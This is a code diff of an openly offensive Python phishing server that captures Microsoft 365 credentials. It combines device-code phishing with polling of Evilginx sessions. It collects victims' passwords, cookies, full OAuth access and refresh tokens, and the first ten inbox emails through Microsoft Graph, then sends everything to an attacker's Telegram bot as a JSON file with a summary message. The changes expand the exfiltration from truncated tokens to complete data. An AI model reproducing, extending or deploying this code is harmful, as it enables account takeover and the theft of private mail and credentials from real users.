@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-Microsoft 365 Token Capture + Inbox Exfiltration (Evilginx + Telegram)
+Microsoft 365 Token Capture + Full Exfiltration (Evilginx + Telegram)
 - Captures tokens via Device Code Flow or Evilginx webhook
 - Fetches first 10 emails using Microsoft Graph (if Mail.Read scope present)
-- Exfiltrates tokens and email summaries to Telegram
+- Exfiltrates ALL data (email, password, cookies, full tokens, emails) as a JSON file to Telegram
+- Sends a short summary message + the JSON file attachment
 """
 
 import os
@@ -77,29 +78,11 @@ def get_inbox_link(email):
     else:
         return "https://outlook.live.com/mail/0/inbox"
 
-def send_telegram_json(data_dict, parse_mode="HTML", retries=3):
-    """Send data to Telegram as formatted JSON with inbox link"""
+def send_telegram_text(message, parse_mode="HTML", retries=3):
+    """Send a simple text message to Telegram."""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         logger.warning("Telegram not configured")
         return False
-    
-    # Build message with JSON structure
-    email = data_dict.get('email', 'unknown')
-    inbox_link = get_inbox_link(email)
-    
-    message = f"""<b>🔐 PHISHED CREDENTIALS & TOKENS</b>
-━━━━━━━━━━━━━━━━━━━━━━━
-
-<b>📬 INBOX ACCESS:</b>
-<a href="{inbox_link}">Click to Open {email}</a>
-
-<b>📦 CAPTURED DATA (JSON):</b>
-<pre>{json.dumps(data_dict, indent=2, ensure_ascii=False)[:3800]}</pre>
-
-━━━━━━━━━━━━━━━━━━━━━━━
-<b>⏰ Time:</b> {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
-<b>🌐 Source:</b> {data_dict.get('source', 'device_code')}"""
-    
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     for attempt in range(1, retries+1):
         try:
@@ -110,7 +93,6 @@ def send_telegram_json(data_dict, parse_mode="HTML", retries=3):
                 "disable_web_page_preview": True
             }, timeout=15)
             if resp.status_code == 200:
-                logger.info(f"Telegram JSON sent for {email}")
                 return True
             else:
                 logger.error(f"Telegram error: {resp.text}")
@@ -120,7 +102,7 @@ def send_telegram_json(data_dict, parse_mode="HTML", retries=3):
     return False
 
 def send_telegram_document(filename, caption="", retries=3):
-    """Send file to Telegram"""
+    """Send a file (JSON) to Telegram."""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return False
     if not os.path.exists(filename):
@@ -140,28 +122,6 @@ def send_telegram_document(filename, caption="", retries=3):
             logger.error(f"Document send attempt {attempt}: {e}")
         time.sleep(2 ** attempt)
     return False
-
-def send_telegram_emails(email, emails):
-    """Send first 10 emails as formatted message to Telegram."""
-    if not emails:
-        return
-    body = f"<b>📬 FIRST {len(emails)} EMAILS FOR {email}</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for idx, msg in enumerate(emails[:10], 1):
-        sender = msg.get('from', {}).get('emailAddress', {}).get('address', 'Unknown')
-        subject = msg.get('subject', 'No Subject')
-        preview = msg.get('bodyPreview', '')[:100]
-        received = msg.get('receivedDateTime', '')
-        body += f"<b>{idx}.</b> <b>From:</b> {sender}\n   <b>Subject:</b> {subject}\n   <b>Preview:</b> {preview}\n   <i>{received}</i>\n\n"
-    body += "━━━━━━━━━━━━━━━━━━━━━━━\n🔗 <a href='https://outlook.office.com/mail/inbox'>Open Full Inbox</a>"
-    if len(body) > 4000:
-        body = body[:4000] + "\n...(truncated)"
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    try:
-        resp = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": body, "parse_mode": "HTML", "disable_web_page_preview": True}, timeout=15)
-        if resp.status_code == 200:
-            logger.info(f"Email list sent for {email}")
-    except Exception as e:
-        logger.error(f"Telegram email send error: {e}")
 
 # ==================== HELPERS ====================
 def decode_jwt_payload(token):
@@ -232,7 +192,6 @@ def get_random_user_agent():
 
 # ==================== GRAPH API HELPERS (EMAIL FETCHING) ====================
 def has_mail_read_scope(access_token):
-    """Check if token contains Mail.Read permission."""
     claims = decode_jwt_payload(access_token)
     if not claims:
         return False
@@ -241,7 +200,6 @@ def has_mail_read_scope(access_token):
     return any(scope in scopes for scope in ['Mail.Read', 'Mail.ReadWrite', 'Mail.Read.All'])
 
 def fetch_inbox_emails(access_token, limit=10):
-    """Fetch latest 'limit' emails from inbox using Microsoft Graph."""
     headers = {"Authorization": f"Bearer {access_token}"}
     url = f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top={limit}&$select=subject,from,receivedDateTime,bodyPreview&$orderby=receivedDateTime desc"
     try:
@@ -256,7 +214,6 @@ def fetch_inbox_emails(access_token, limit=10):
         return None
 
 def refresh_access_token(refresh_token, client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"):
-    """Attempt to refresh expired token."""
     token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
     data = {
         "client_id": client_id,
@@ -310,59 +267,67 @@ def init_db():
     conn.close()
     logger.info("Database initialized")
 
-def save_tokens_locally(email, email_source, access_token, refresh_token,
-                        id_token, expires_in, raw_response, user_code, client_name,
-                        password=None, cookies=None, evilginx_source=None):
+def save_full_json(email, email_source, access_token, refresh_token, id_token,
+                   expires_in, raw_response, user_code, client_name,
+                   password, cookies, geo, ip, user_agent, client_id,
+                   emails, source):
+    """Save everything as a single JSON file and return the filename."""
     safe_email = email.replace("@", "_at_").replace(".", "_dot_") if email else "unknown"
     timestamp = int(time.time())
-    token_data = {
-        "email": email or "UNKNOWN",
+    full_data = {
+        "capture_timestamp": datetime.datetime.utcnow().isoformat() + "Z",
+        "source": source,
+        "email": email,
         "email_source": email_source,
-        "access_token": access_token,
-        "refresh_token": refresh_token,
-        "id_token": id_token,
-        "client": client_name,
-        "user_code": user_code,
-        "expires_in_seconds": expires_in,
-        "captured_at": datetime.datetime.utcnow().isoformat() + "Z",
-        "raw_response": raw_response,
-        "password": password,
-        "cookies": cookies,
-        "evilginx_source": evilginx_source
-    }
-    json_filename = os.path.join(TOKENS_DIR, f"tokens_{safe_email}_{timestamp}.json")
-    with open(json_filename, "w", encoding="utf-8") as f:
-        json.dump(token_data, f, indent=2, ensure_ascii=False)
-    logger.info(f"Tokens saved locally: {json_filename}")
-    return json_filename
-
-# ==================== PROCESS CAPTURE (WITH EMAIL FETCHING) ====================
-def process_capture(email, email_source, access_token, refresh_token, id_token,
-                    ip, geo, client_name, user_code, expires_in, used_client_id,
-                    password=None, cookies=None, source="device_code", raw_response=None):
-    """Process captured data, send to Telegram as JSON, and fetch first 10 emails if possible"""
-    
-    # Build JSON payload for Telegram
-    telegram_data = {
-        "email": email or "UNKNOWN",
         "password": password,
         "cookies": cookies if isinstance(cookies, dict) else (json.loads(cookies) if cookies else None),
         "tokens": {
-            "access_token": access_token[:100] + "..." if access_token and len(access_token) > 100 else access_token,
-            "refresh_token": refresh_token[:100] + "..." if refresh_token and len(refresh_token) > 100 else refresh_token,
-            "id_token": id_token[:100] + "..." if id_token and len(id_token) > 100 else id_token,
+            "access_token": access_token,
+            "refresh_token": refresh_token,
+            "id_token": id_token
         },
-        "client": client_name,
-        "user_code": user_code,
-        "ip": ip,
-        "location": f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}",
-        "isp": geo.get('isp', 'Unknown'),
-        "source": source,
-        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
+        "client": {
+            "client_id": client_id,
+            "client_name": client_name,
+            "user_code": user_code,
+            "expires_in_seconds": expires_in
+        },
+        "raw_oauth_response": raw_response,
+        "location": {
+            "ip": ip,
+            "city": geo.get("city"),
+            "country": geo.get("country"),
+            "isp": geo.get("isp")
+        },
+        "user_agent": user_agent,
+        "inbox_emails": emails if emails else []
     }
+    json_filename = os.path.join(TOKENS_DIR, f"full_capture_{safe_email}_{timestamp}.json")
+    with open(json_filename, "w", encoding="utf-8") as f:
+        json.dump(full_data, f, indent=2, ensure_ascii=False)
+    logger.info(f"Full data saved: {json_filename}")
+    return json_filename
+
+# ==================== PROCESS CAPTURE (FULL EXFILTRATION) ====================
+def process_capture(email, email_source, access_token, refresh_token, id_token,
+                    ip, geo, client_name, user_code, expires_in, used_client_id,
+                    password=None, cookies=None, source="device_code", raw_response=None):
+    """Process captured data: save full JSON, send to Telegram as file + summary."""
     
-    # Save JSON locally
-    json_file = save_tokens_locally(
+    # Fetch first 10 emails if token allows
+    emails = None
+    if access_token and has_mail_read_scope(access_token):
+        logger.info(f"Token has Mail.Read scope, fetching inbox for {email}")
+        emails = fetch_inbox_emails(access_token, limit=10)
+        if emails is None:
+            emails = []
+            logger.warning(f"Failed to fetch emails for {email}")
+    elif access_token:
+        scopes = decode_jwt_payload(access_token).get('scp', '') if access_token else ''
+        logger.info(f"Token lacks Mail.Read scope for {email}. Scopes: {scopes}")
+    
+    # Save everything to a single JSON file
+    json_file = save_full_json(
         email=email,
         email_source=email_source,
         access_token=access_token or "",
@@ -373,44 +338,61 @@ def process_capture(email, email_source, access_token, refresh_token, id_token,
         user_code=user_code,
         client_name=client_name,
         password=password,
-        cookies=json.dumps(cookies) if cookies and isinstance(cookies, dict) else cookies,
-        evilginx_source=source
+        cookies=cookies,
+        geo=geo,
+        ip=ip,
+        user_agent=request.headers.get("User-Agent", "Unknown") if hasattr(request, 'headers') else "Unknown",
+        client_id=used_client_id,
+        emails=emails,
+        source=source
     )
     
-    # Send to Telegram as JSON
-    send_telegram_json(telegram_data)
-    send_telegram_document(json_file, caption=f"Full tokens for {email}")
+    # Prepare Telegram summary message
+    inbox_link = get_inbox_link(email)
+    summary = f"""<b>🔐 NEW CAPTURE</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>📧 Email:</b> {email}
+<b>🔑 Password:</b> {'Yes' if password else 'No'}
+<b>🍪 Cookies:</b> {'Yes' if cookies else 'No'}
+<b>📬 Inbox access:</b> {'Yes' if emails is not None else 'No'} {f'({len(emails)} emails)' if emails else ''}
+
+<b>🌐 Source:</b> {source}
+<b>📍 IP:</b> {ip} ({geo.get('city')}, {geo.get('country')})
+
+<b>📎 Full data attached as JSON file.</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+<a href="{inbox_link}">📬 Open Inbox</a>"""
+
+    # Send summary + document
+    send_telegram_text(summary)
+    send_telegram_document(json_file, caption=f"Full capture for {email}")
     
-    # --- Fetch first 10 emails from inbox using access token ---
-    if access_token:
-        if has_mail_read_scope(access_token):
-            logger.info(f"Token has Mail.Read scope, fetching inbox for {email}")
-            emails = fetch_inbox_emails(access_token, limit=10)
-            if emails:
-                send_telegram_emails(email, emails)
-            else:
-                send_telegram_json({
-                    "email": email,
-                    "warning": "Failed to fetch emails (Graph API error or no emails found)",
-                    "source": source
-                }, parse_mode="HTML")
-        else:
-            scopes = decode_jwt_payload(access_token).get('scp', '') if access_token else ''
-            logger.info(f"Token lacks Mail.Read scope for {email}. Scopes: {scopes}")
-            send_telegram_json({
-                "email": email,
-                "warning": "Token does NOT have Mail.Read permission. Cannot fetch inbox.",
-                "scopes": scopes,
-                "source": source
-            }, parse_mode="HTML")
-    else:
-        logger.warning(f"No access_token for {email}, skipping inbox fetch")
+    # Also save to database (truncated for performance)
+    conn = sqlite3.connect(DB_NAME)
+    conn.execute("""INSERT INTO captures
+        (timestamp, user_code, device_code, email, email_source,
+         access_token, refresh_token, id_token, expires_in,
+         ip_address, city, country, isp, user_agent,
+         client_id, client_name, success, full_data,
+         password, cookies, evilginx_source)
+        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+        (datetime.datetime.utcnow().isoformat() + "Z",
+         user_code if source != "evilginx_webhook" else "evilginx",
+         user_code if source != "evilginx_webhook" else "evilginx",
+         email, email_source,
+         (access_token or "")[:200], (refresh_token or "")[:200], (id_token or "")[:200], expires_in,
+         ip, geo.get("city"), geo.get("country"), geo.get("isp"),
+         "stored", used_client_id, client_name, 1,
+         json.dumps({"summary": "full data saved to file"}), password,
+         json.dumps(cookies) if cookies else None, source))
+    conn.commit()
+    conn.close()
     
     logger.info(f"Processed capture for {email} from {source}")
 
 # ==================== EVILGINX PROCESSING ====================
 def process_evilginx_capture(data, ip, user_agent, source="evilginx_webhook"):
-    """Process Evilginx captured data"""
     access_token = data.get("access_token")
     refresh_token = data.get("refresh_token")
     id_token = data.get("id_token")
@@ -421,7 +403,6 @@ def process_evilginx_capture(data, ip, user_agent, source="evilginx_webhook"):
 
     geo = get_geolocation(ip)
 
-    # Extract email if not provided
     if not email and (access_token or id_token):
         email, email_source = extract_real_email(access_token, id_token)
     else:
@@ -434,25 +415,6 @@ def process_evilginx_capture(data, ip, user_agent, source="evilginx_webhook"):
     client_name = get_client_name(client_id)
     expires_in = 3600
 
-    # Insert into database
-    conn = sqlite3.connect(DB_NAME)
-    conn.execute("""INSERT INTO captures
-        (timestamp, user_code, device_code, email, email_source,
-         access_token, refresh_token, id_token, expires_in,
-         ip_address, city, country, isp, user_agent,
-         client_id, client_name, success, full_data,
-         password, cookies, evilginx_source)
-        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
-        (datetime.datetime.utcnow().isoformat() + "Z",
-         "evilginx", "evilginx", email, email_source,
-         access_token or "", refresh_token or "", id_token or "", expires_in,
-         ip, geo.get("city"), geo.get("country"), geo.get("isp"), user_agent,
-         client_id, client_name, 1, json.dumps(data),
-         password, json.dumps(cookies) if cookies else None, source))
-    conn.commit()
-    conn.close()
-
-    # Process and send to Telegram
     process_capture(
         email=email,
         email_source=email_source,
@@ -484,7 +446,6 @@ def is_valid_sqlite_db(db_path):
         return False
 
 def fetch_new_evilginx_sessions():
-    """Poll Evilginx database for new sessions"""
     if not os.path.exists(EVILGINX_DB_PATH):
         return
 
@@ -497,13 +458,11 @@ def fetch_new_evilginx_sessions():
         evil_conn.row_factory = sqlite3.Row
         cursor = evil_conn.cursor()
 
-        # Check for sessions table
         cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'")
         if not cursor.fetchone():
             evil_conn.close()
             return
 
-        # Get processed IDs
         main_conn = sqlite3.connect(DB_NAME)
         processed_ids = set(row[0] for row in main_conn.execute("SELECT session_id FROM evilginx_processed"))
         main_conn.close()
@@ -516,13 +475,11 @@ def fetch_new_evilginx_sessions():
             if not session_id or session_id in processed_ids:
                 continue
 
-            # Extract data
             ip = row.get("ip") or row.get("remote_addr") or "0.0.0.0"
             user_agent = row.get("user_agent") or "Unknown"
             email = row.get("username") or row.get("email") or ""
             password = row.get("password") or ""
 
-            # Extract tokens
             access_token = ""
             refresh_token = ""
             id_token = ""
@@ -541,7 +498,6 @@ def fetch_new_evilginx_sessions():
                 refresh_token = row.get("refresh_token") or ""
                 id_token = row.get("id_token") or ""
 
-            # Cookies
             cookies = None
             if "cookies" in row.keys() and row["cookies"]:
                 try:
@@ -562,7 +518,6 @@ def fetch_new_evilginx_sessions():
 
             process_evilginx_capture(data, ip, user_agent, source="evilginx_db")
 
-            # Mark as processed
             main_conn = sqlite3.connect(DB_NAME)
             main_conn.execute("INSERT INTO evilginx_processed (session_id, processed_at) VALUES (?, ?)",
                               (session_id, datetime.datetime.utcnow().isoformat() + "Z"))
@@ -627,11 +582,10 @@ def poll_for_tokens(device_code, user_code, ip_address, geo_data, user_agent, cl
                     success=1, email=?, email_source=?, access_token=?,
                     refresh_token=?, id_token=?, expires_in=?, full_data=?
                     WHERE user_code=?""",
-                    (real_email, src, at, rt, idt, exp, json.dumps(result), user_code))
+                    (real_email, src, at[:200], rt[:200], idt[:200], exp, json.dumps(result), user_code))
                 conn.commit()
                 conn.close()
 
-                # Process and send to Telegram
                 process_capture(
                     email=real_email,
                     email_source=src,
@@ -683,7 +637,7 @@ def requires_auth(f):
         return f(*args, **kwargs)
     return decorated
 
-# ==================== HTML TEMPLATES ====================
+# ==================== HTML TEMPLATES (unchanged, omitted for brevity) ====================
 INDEX_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -1283,7 +1237,6 @@ def evilginx_capture():
 
 @app.route('/docx')
 def docx():
-    """Serve the same HTML as the root path"""
     return render_template_string(INDEX_HTML)
 
 @app.route("/stats")
@@ -1300,36 +1253,28 @@ def show_stats():
 
 @app.route("/test-telegram")
 def test_telegram():
-    test_data = {
-        "email": "test@example.com",
-        "password": "test_password_123",
-        "cookies": {"session": "test_cookie_value"},
-        "tokens": {"access_token": "test_token_here"},
-        "source": "test",
-        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
-    }
-    ok = send_telegram_json(test_data)
-    return jsonify({"status": "ok" if ok else "error"})
+    test_file = os.path.join(TOKENS_DIR, "test.json")
+    with open(test_file, "w") as f:
+        json.dump({"test": "data"}, f)
+    send_telegram_text("Test message")
+    send_telegram_document(test_file, "Test attachment")
+    return jsonify({"status": "ok"})
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
     init_db()
-    
-    # Start Evilginx DB monitor
     monitor_thread = threading.Thread(target=evilginx_db_monitor, daemon=True)
     monitor_thread.start()
-    
     print("=" * 70)
-    print("  TOKEN CAPTURE SYSTEM - Telegram Exfiltration + Inbox Emails")
-    print("  Captures tokens and fetches first 10 emails if Mail.Read scope present")
+    print("  TOKEN CAPTURE + FULL EXFILTRATION TO TELEGRAM (JSON FILE)")
+    print("  Captures email, password, cookies, full tokens, first 10 emails")
+    print("  Sends summary + JSON file attachment to Telegram")
     print("=" * 70)
     print(f"  🌐 Phishing Page : http://0.0.0.0:5000")
     print(f"  🔐 Dashboard     : http://0.0.0.0:5000/dashboard")
     print(f"  📁 Tokens folder : ./{TOKENS_DIR}/")
     print(f"  🤖 Telegram      : {TELEGRAM_BOT_TOKEN[:20]}...")
     print("=" * 70)
-    
     if TELEGRAM_BOT_TOKEN and "YOUR_BOT_TOKEN" not in TELEGRAM_BOT_TOKEN:
-        send_telegram_json({"status": "online", "message": "Token capture + email exfiltration system active"})
-    
+        send_telegram_text("<b>✅ Token capture system online</b>\nFull exfiltration ready.")
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
